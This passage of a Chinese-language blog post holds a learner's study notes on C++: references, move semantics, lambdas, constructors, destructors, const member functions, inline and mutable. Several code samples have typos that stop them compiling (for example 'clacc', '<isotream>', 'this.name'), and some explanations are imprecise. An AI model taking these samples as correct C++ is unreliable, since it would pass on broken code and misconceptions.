class="line">	++g_i;<span class="comment">//程序运行时执行</span></span><br><span class="line">	std::cout &lt;&lt; testFuncCallCount &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**2.**指针都是存储在栈上和堆上，不管在栈上还是堆上，都一定有一个地址。</p>
<p>本质上说，指针和普通变量没有区别。</p>
<p>在32位系统中，int变量和指针都是32位。指针必须和“&amp;”，“*”这两个符号一起使用才有意义。</p>
<p>&amp;a代表的a这个变量的地址，a代表的a对应地址存储的值，*a代表对应地址存储的值作为地址对应的值。</p>
<p>所以指针才可以灵活的操作内存，但这也带来了严重的副作用，比如指针加加减减就可以操作内存，所以引用被发明了，引用就是作用阉割的指针（可以视为“类型*const”，所以引用必须上来就赋初值，不能设置为空），编译器不将其视作对象，操作引用相当于操作引用指向的对象。也就从根本是杜绝了引用篡改内存的能力。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">20</span>;</span><br><span class="line"><span class="type">int</span>&amp; refI=i;<span class="comment">//类似于int* const pi=&amp;i;</span></span><br></pre></td></tr></table></figure>

<h2 id="左值，右值，左值引用，右值引用"><a href="#左值，右值，左值引用，右值引用" class="headerlink" title="(**)左值，右值，左值引用，右值引用"></a>(**)左值，右值，左值引用，右值引用</h2><p><strong>1.左值和右值</strong></p>
<p>C++任何一个对象要么是左值，要么是右值。比如int i &#x3D; 10，i和10都是对象</p>
<p><strong>左值：</strong>拥有地址属性的对象就叫左值，左值可以放在等号右边，也可以放在等号左边</p>
<p><strong>右值：</strong>不是左值的对象就是右值。无法操作地址属性的对象就是右值。比如临时对象，就都是右值，临时对象的地址属性无法使用。注意：左值也可以放在“&#x3D;”右面，但右值绝对不可以放在等号左面</p>
<p>演示</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> i2=i+<span class="number">1</span>;<span class="comment">//i+1为临时对象，有地址但无法使用地址</span></span><br><span class="line">++i；<span class="comment">//左值 i++为右值</span></span><br></pre></td></tr></table></figure>

<p><strong>2.引用的分类</strong></p>
<p>(1) 普通左值引用：就是一个对象的别名，只能绑定左值，无法绑定常量对象。</p>
<p>(2) const左值引用：可以对常量起别名，可以绑定左值和右值</p>
<p>(3) 只能绑定右值的引用。</p>
<p>(4) 万能引用</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">100</span>;</span><br><span class="line"><span class="type">int</span>&amp; refi=i;<span class="comment">//只能绑定左值</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span>&amp; i;<span class="comment">//绑定左值</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span>&amp; (i+<span class="number">1</span>);<span class="comment">//绑定右值</span></span><br><span class="line"><span class="type">int</span>&amp;&amp; rrefi=(i+<span class="number">1</span>);<span class="comment">//右值引用</span></span><br><span class="line"><span class="type">int</span>&amp;&amp; rrefi=i++;<span class="comment">//右值引用</span></span><br></pre></td></tr></table></figure>

<h2 id="move函数，临时对象"><a href="#move函数，临时对象" class="headerlink" title="(**)move函数，临时对象"></a>(**)move函数，临时对象</h2><p><strong>1.move函数</strong></p>
<p>(1) 右值看重对象的值而不考虑地址，move函数可以对一个左值使用，使操作系统不再在意其地址属性，将其完全视作一个右值。</p>
<p>(2) move函数让操作的对象失去了地址属性，<strong>所以我们有义务保证以后不再使用该变量的地址属性，简单来说就是不再使用该变量，因为左值对象的地址是其使用时无法绕过的属性。</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span>&amp;&amp; rrefi=std::<span class="built_in">move</span>(i);<span class="comment">//std::move(i)整体是个右值，i能继续赋值</span></span><br></pre></td></tr></table></figure>

<p><strong>2.临时对象</strong></p>
<p><strong>右值都是不体现地址的对象。那么，还有什么能比临时对象更加没有地址属性呢？右值引用主要负责处理的就是临时对象。</strong></p>
<p>程序执行时生成的中间对象就是临时对象，注意，所有的临时对象都是右值对象，因为临时对象产生后很快就可能被销毁，使用的是它的值属性。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getI</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>;<span class="comment">//return 的是一个临时对象，所有的临时对象都是右值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span>&amp;&amp; rrefi=<span class="built_in">getI</span>();<span class="comment">//接收不到就会销毁</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="可调用对象"><a href="#可调用对象" class="headerlink" title="(**)可调用对象"></a>(**)可调用对象</h2><p>如果一个对象可以使用调用运算符“()”，()里面可以放参数，这个对象就是可调用对象。</p>
<p><strong>1.函数：</strong>函数自然可以调用()运算符，是最典型的可调用对象</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">using</span> pf_type = <span class="built_in">void</span>(*)(<span class="type">int</span>);</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myFunc</span><span class="params">(pf_type pf, <span class="type">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">pf</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">myFunc</span>(test,<span class="number">200</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>2.仿函数：</strong>具有operator()函数的类对象，此时类对象可以当做函数使用，因此称为仿函数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> i)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;void operator()(int i)&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Test t;</span><br><span class="line">	<span class="built_in">t</span>(<span class="number">20</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>3.lambda表达式</strong></p>
<p>就是匿名函数，普通的函数在使用前需要找个地方将这个函数定义，于是C++提供了lambda表达式，需要函数时直接在需要的地方写一个lambda表达式，省去了定义函数的过程，增加开发效率。</p>
<p><strong>注意：lambda表达式很重要，</strong>现代C++程序中，lambda表达式是大量使用的</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	[i] (<span class="type">int</span> elem) &#123;</span><br><span class="line">		std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">		std::cout &lt;&lt; elem &lt;&lt; std::endl;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;(<span class="number">200</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>lambda表达式的格式</strong>最少是“[] {}”，完整的格式为“[] () -&gt;ret {}”。</p>
<p>lambda各组件介绍</p>
<p>lambda各个组件介绍</p>
<p><strong>1.</strong>[]代表捕获列表：表示lambda表达式可以访问前文的哪些变量。</p>
<p>(1) []表示不捕获任何变量。</p>
<p>(2) [&#x3D;]：表示按值捕获所有变量。</p>
<p>(3) [&amp;]：表示按照引用捕获所有变量。</p>
<p>&#x3D;，&amp;也可以混合使用，比如</p>
<p>(4) [&#x3D;, &amp;i]：表示变量i用引用传递，除i的所有变量用值传递。</p>
<p>(5) [&amp;, i]：表示变量i用值传递，除i的所有变量用引用传递。</p>
<p>当然，也可以捕获单独的变量</p>
<p>(6) [i]：表示以值传递的形式捕获i</p>
<p>(7) [&amp;i]：表示以引用传递的方式捕获i</p>
<p>啊，part1结束，下周一定减少划水时间，多听课</p>
<img src="https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图 2023-03-06 160805.png" style="zoom:33%;">

<h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><p>类的权限修饰：c++通过 <strong>public、protected、private</strong> 三个关键字来控制成员变量和成员函数的访问权限，它们分别表示公有的、受保护的、私有的，被称为成员访问限定符。所谓访问权限，就是你能不能使用该类中的成员。</p>
<p>在类的内部（定义类的代码内部），无论成员被声明为 public、protected 还是 private，都是可以互相访问的，没有访问权限的限制。在类的外部（定义类的代码之外），只能通过对象访问成员，并且通过对象只能访问 public 属性的成员，不能访问 private、protected 属性的成员。</p>
<h2 id="类介绍，构造函数，析构函数"><a href="#类介绍，构造函数，析构函数" class="headerlink" title="(*)类介绍，构造函数，析构函数"></a>(*)类介绍，构造函数，析构函数</h2><p><strong>1.类介绍：</strong></p>
<p>(1) 对面向对象和面向过程的理解</p>
<p>① 面向对象和面向过程是一个相对的概念。</p>
<p>② 面向过程是按照计算机的工作逻辑来编码的方式，最典型的面向过程的语言就是c语言了，c语言直接对应汇编，汇编又对应电路。</p>
<p>③ 面向对象则是按照人类的思维来编码的一种方式，C++就完全支持面向对象功能，可以按照人类的思维来处理问题。</p>
<p>④ 举个例子，要把大象装冰箱，按照人类的思路自然是分三步，打开冰箱，将大象装进去，关上冰箱。</p>
<p>要实现这三步，我们就要首先有人，冰箱这两个对象。人有给冰箱发指令的能	力，冰箱有能够接受指令并打开或关闭门的能力。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//c++</span></span><br><span class="line"><span class="meta">#inlcude<span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IceChest</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">openIceChest</span><span class="params">(<span class="type">const</span> IceChest&amp; iceChest)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IceChest</span>:</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">openDoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">closeDoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//c语言</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">IceChest</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">personOpenIceChest</span><span class="params">(<span class="type">const</span> Person&amp; person,<span class="type">const</span> IceChest&amp; iceChest)</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">personCloseIceChest</span><span class="params">(<span class="type">const</span> Person&amp; person,<span class="type">const</span> IceChest&amp; iceChest)</span></span></span><br></pre></td></tr></table></figure>

<p>但是从计算机的角度讲，计算机只能定义一个叫做人和冰箱的结构体。人有手这个部位，冰箱有门这个部位。然后从天而降一个函数，是这个函数让手打开了冰箱，又是另一个函数让大象进去，再是另一个函数让冰箱门关上。</p>
<p> 从开发者的角度讲，面向对象显然更利于程序设计。用面向过程的开发方式，程序一旦大了，各种从天而降的函数会非常繁琐，一些用纯c写的大型程序，实际上也是模拟了面向对象的方式。</p>
<p> 那么，如何用面向过程的c语言模拟出面向对象的能力呢？类就诞生了，在类中可以定义专属于类的函数，让类有了自己的动作。回到那个例子，人的类有了让冰箱开门的能力，冰箱有了让人打开的能力，不再需要天降神秘力量了，hh</p>
<p> <strong>2.构造函数</strong></p>
<p> 类是通过面向过程的机器实现的，类相当于定义了一个新类型，该类型生成在堆或栈上的对象时内存排布和c语言相同。但是c++规定，<strong>C++有在类对象创建时就在对应内存将数据初始化的能力</strong>，这就是构造函数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;isotream&gt;</span></span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">CPPtest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">CPPTest</span>(<span class="type">int</span> i_,<span class="type">int</span> i2_) :<span class="built_in">i</span>(i_),<span class="built_in">i2</span>(i2_)&#123;&#125;<span class="comment">//c++可以在类中构造函数，将参数对应内存初始化;若没有，则自动生成，但是没什么用</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> i2;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">CPPtest <span class="title">cppTest</span><span class="params">(<span class="number">1</span>,<span class="number">2</span>)</span></span>;<span class="comment">//初始化i,i2</span></span><br><span class="line">    std::cout&lt;&lt;cppTest.i&lt;&lt;std::endl;</span><br><span class="line">    std::cout&lt;&lt;cppTest.i2&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>构造函数有以下类型。</p>
<ol>
<li><p>普通构造函数</p>
</li>
<li><p>复制构造函数：用另一个对象来初始化对象对应的内存</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">CPPTest</span>(<span class="type">const</span> CPPTest&amp; cppTest) :<span class="built_in">i</span>(cppTest.i), <span class="built_in">i2</span>(cppTest.i2)&#123;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>移动构造函数：也是用另一个对象来初始化对象，具体内容会在Part3第13节详细讲解。</p>
</li>
<li><p>默认构造函数：当类没有任何构造函数时，编译期会为该类生成一个默认的的构造函数，在最普通的类中，默认构造函数什么都没做，对象对应的内存没有被初始化。</p>
</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">CPPTest</span>()&#123;&#125;;<span class="comment">//作用和构造函数一样</span></span><br></pre></td></tr></table></figure>

<p>构造函数就是C++提供的<strong>必须有的</strong>在对象创建时初始化对象的方法，（默认的什么都不做也是一种初始化的方式）</p>
<p><strong>3.析构函数</strong></p>
<p>介绍:</p>
<p>类对象被销毁时，就会调用析构函数。栈上对象的销毁时机就是函数栈销毁时,堆上的对象销毁时机就是该堆内存被手动释放时，如果用new申请的这块堆内存，那调用delete销毁这块内存时就会调用析构函数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;isotream&gt;</span></span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">CPPTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">CPPTest</span>(<span class="type">int</span> i_,<span class="type">int</span> i2_) :<span class="built_in">i</span>(i_),<span class="built_in">i2</span>(i2_)&#123;&#125;</span><br><span class="line">    <span class="built_in">CPPTest</span>(<span class="type">const</span> CPPTest&amp; cppTest) :<span class="built_in">i</span>(cppTest.i), <span class="built_in">i2</span>(cppTest.i2)&#123;&#125;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> i2;</span><br><span class="line">    ~<span class="built_in">CPPTest</span>()<span class="comment">//如没有会自动添加</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">CPPTest <span class="title">cppTest</span><span class="params">(<span class="number">1</span>,<span class="number">2</span>)</span></span>;<span class="comment">//初始化i,i2</span></span><br><span class="line">    std::cout&lt;&lt;cppTest.i&lt;&lt;std::endl;</span><br><span class="line">    std::cout&lt;&lt;cppTest.i2&lt;&lt;std::endl;</span><br><span class="line">    CPPTest* pCppTest=<span class="keyword">new</span> <span class="built_in">CppTest</span>(<span class="number">1.2</span>);<span class="comment">//调用在堆上，自动销毁</span></span><br><span class="line">    <span class="keyword">delete</span> PCppTest;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是再某些情况下，析构函数必须要干活</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;isotream&gt;</span></span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">CPPTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">CPPTest</span>(<span class="type">int</span> i_,<span class="type">int</span> i2_) :<span class="built_in">i</span>(i_),<span class="built_in">i2</span>(i2_),<span class="built_in">pi</span>(<span class="keyword">new</span> <span class="built_in">int</span>(i3))&#123;&#125;</span><br><span class="line">    <span class="built_in">CPPTest</span>(<span class="type">const</span> CPPTest&amp; cppTest) :<span class="built_in">i</span>(cppTest.i), <span class="built_in">i2</span>(cppTest.i2),<span class="built_in">pi</span>(<span class="keyword">new</span> <span class="built_in">int</span>(*cppTest.pi))&#123;&#125;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> i2;</span><br><span class="line">    <span class="type">int</span> *pi;</span><br><span class="line">    ~<span class="built_in">CPPTest</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">delete</span> pi;</span><br><span class="line">    &#125;<span class="comment">//当栈上pi指向堆上的i3，如果析构函数中没有delete，那么只会把栈上的释放，堆上的数据没有释放，会造成内存泄漏</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结，当类对象销毁时有一些我们必须手动操作的步骤时，析构函数就派上了用场。所以，几乎所有的类我们都要写构造函数，析构函数却未必需要</p>
<h2 id="this-常成员函数与常对象"><a href="#this-常成员函数与常对象" class="headerlink" title="(*)this,常成员函数与常对象"></a>(*)this,常成员函数与常对象</h2><p><strong>1.this关键字：</strong></p>
<p>(1) this是什么：</p>
<p>① 编译器将this解释为指向函数所作用的对象的指针，这句话新手有些不好理解，用代码演示一下就好说了。C++类的本质就是C语言的结构体外加几个类外的函数，C++最后都要转化为C语言来实现，类外的函数就是通过this来指向这个类的。</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">clacc Test</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">       <span class="built_in">Test</span>(<span class="type">const</span> std::string&amp; name_, <span class="type">unsigned</span> old_);</span><br><span class="line">       ~<span class="built_in">Test</span>();</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">output</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;name=&quot;</span>&lt;&lt;<span class="keyword">this</span>-&gt;name&lt;&lt;<span class="string">&quot;     old=&quot;</span>&lt;&lt;<span class="keyword">this</span>-&gt;old&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">       std::string name;</span><br><span class="line">       <span class="type">unsigned</span> old;</span><br><span class="line">&#125;;</span><br><span class="line">Test::<span class="built_in">Test</span>(<span class="type">const</span> std::string&amp; name_,<span class="type">unsigned</span> old_):<span class="built_in">name</span>(name_),<span class="built_in">old</span>(old_)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">Test::~<span class="built_in">Test</span>()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Test <span class="title">test</span><span class="params">(<span class="string">&quot;fanfan&quot;</span>,<span class="number">20</span>)</span></span>;</span><br><span class="line">    test.<span class="built_in">outPut</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>② 当然，这么说并非完全准确，this是一个关键字，只是我们将它当做指针理解罢了。</p>
<p> this有很多功能是单纯的指针无法满足的。比如每个类函数的参数根本没有名叫this的指针。这不过是编译器赋予的功能罢了。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">clacc Test</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">       <span class="built_in">Test</span>(<span class="type">const</span> std::string&amp; name_, <span class="type">unsigned</span> old_);</span><br><span class="line">       ~<span class="built_in">Test</span>();</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">output</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;name=&quot;</span>&lt;&lt;<span class="keyword">this</span>.name&lt;&lt;<span class="string">&quot;     old=&quot;</span>&lt;&lt;<span class="keyword">this</span>.old&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">       std::string name;</span><br><span class="line">       <span class="type">unsigned</span> old;</span><br><span class="line">&#125;;</span><br><span class="line">Test::<span class="built_in">Test</span>(<span class="type">const</span> std::string&amp; name_,<span class="type">unsigned</span> old_):<span class="built_in">name</span>(name_),<span class="built_in">old</span>(old_)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">Test::~<span class="built_in">Test</span>()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">void</span> (Test::* pf)()=&amp;Test::output;<span class="comment">//空参数的指针能指向类的成员函数，说明类中没有this这个形参变量</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Test <span class="title">test</span><span class="params">(<span class="string">&quot;fanfan&quot;</span>,<span class="number">20</span>)</span></span>;</span><br><span class="line">    (test.*pf)();<span class="comment">//结果一样</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2.常成员函数和常对象</strong></p>
<p>某位大佬说：“常成员函数和常对象很多人并不在意，确实，都写普通变量也可以。但是，我还是要提一点，在大型程序中，尽量加上const关键字可以减少很多不必要的错误。<strong>这一点，开发过大型程序的人应该深有体会，没开发过大型程序的人也不必在意，记住多用const，这是一个很好的习惯</strong>。“</p>
<p>(1) 常成员函数就是无法修改成员变量的函数。可以理解为将this指针指向对象用const修饰的函数。(例子在本节的第一个代码演示)</p>
<p>常对象就是用const修饰的对象，定义好之后就再也不需要更改成员变量的值了。</p>
<p>(2) 常成员函数注意事项：</p>
<p>因为类的成员函数已经将this指针省略了，只能在函数后面加const关键字来实现无法修改类成员变量的功能了</p>
<p>① 注意：常函数无法调用了普通函数，无意义。</p>
<p><strong>②</strong> <strong>成员函数能写作常成员函数就尽量写作常成员函数，可以减少出错几率。</strong></p>
<p>③ 同名的常成员函数和普通成员函数是可以重载的，常量对象会优先调用常成员函数，普通对象会优先调用普通成员函数。</p>
<p>(3) 常对象注意事项：</p>
<p>① 常对象不能调用普通函数</p>
<p>② 常函数在大型程序中真的很重要，很多时候我们都需要创建好就不再改变的对象</p>
<p><strong>大佬强调：常对象和常函数要多用</strong></p>
<h2 id="inline，mutable，default，delete"><a href="#inline，mutable，default，delete" class="headerlink" title="inline，mutable，default，delete"></a><strong>inline，mutable，default，delete</strong></h2><p>inline,mutable知道就行，default和delete需要掌握</p>
<p><strong>1.inline关键字</strong></p>
<p>(1) inline关键字的有什么作用：</p>
<p>① 在函数声明或定义中函数返回类型前加上关键字inline就可以把函数指定为<strong>内联函数</strong>。关键字inline必须与函数定义放在一起才能使函数成为内联，仅仅将inline放在函数声明前不起任何作用。</p>
<p> ② 内联函数的作用，普通函数在调用时需要给函数分配栈空间以供函数执行，压栈等操作会影响成员运行效率，于是C++提供了<strong>内联函数将函数体放到需要调用函数的地方</strong>，用空间换效率。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">public</span>:  </span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">outPut</span><span class="params">()</span></span>;<span class="comment">//默认有inline，后边的不加，这里加了也是无效的</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">Test::outPut</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;hello world&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Test test;</span><br><span class="line">    test.<span class="built_in">outPut</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> (2) inline关键字的注意事项：inline关键字只是一个建议，开发者建议编译器将成员函数当做内联函数，一般适合搞内联的情况编译器都会采纳建议。（牺牲空间换取时间）</p>
<p> (3) **总结:**使用inline关键字就是一种提高效率，但加大编译后文件大小的方式，现在随着硬件性能的提高，inline关键字用的越来越少了。</p>
<p><strong>2.mutable关键字</strong></p>
<p>(1) mutable关键字的作用：</p>
<p>① Mutable意为可变的，与const相对，被mutable修饰的成员变量，永远处于可变的状态，即便处于一个常函数中，该变量也可以被更改。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">outPut</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">    <span class="keyword">mutable</span> <span class="type">unsigned</span> outPutCallCount=<span class="number">0</span>;</span><br><span class="line">   &#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Test::outPut</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ++outPutCallCount;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;hello world&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Test test;</span><br><span class="line">    test.<span class="built_in">outPut</span>();</span><br><span class="line">   